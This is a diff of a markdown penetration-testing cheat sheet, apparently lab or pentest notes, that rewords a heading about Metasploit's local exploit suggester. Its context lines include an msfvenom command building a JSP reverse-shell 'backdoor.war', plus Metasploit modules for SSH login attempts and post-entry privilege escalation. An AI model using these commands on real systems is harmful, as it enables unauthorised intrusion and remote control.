@@ -122,7 +122,6 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4449 -f war > backdoor.war
 ```
 
 
-
 ## Attempt to Elevate permissions after entry
 
 ### Open SSH through Metasploit
@@ -137,13 +136,13 @@ use auxiliary/scanner/ssh/ssh_login
 use post/multi/manage/shell_to_meterpreter
 ```
 
-##### Run Inside of Meterpreter
+##### Gather random exploits possibilities.
 
 ```
-run post/multi/recon/local_exploit_suggester
+use post/multi/recon/local_exploit_suggester
 ```
-
 Gives readout of possible vulnerabilities of connected host
+
 
 ### NFS (RPCBIND?)
 
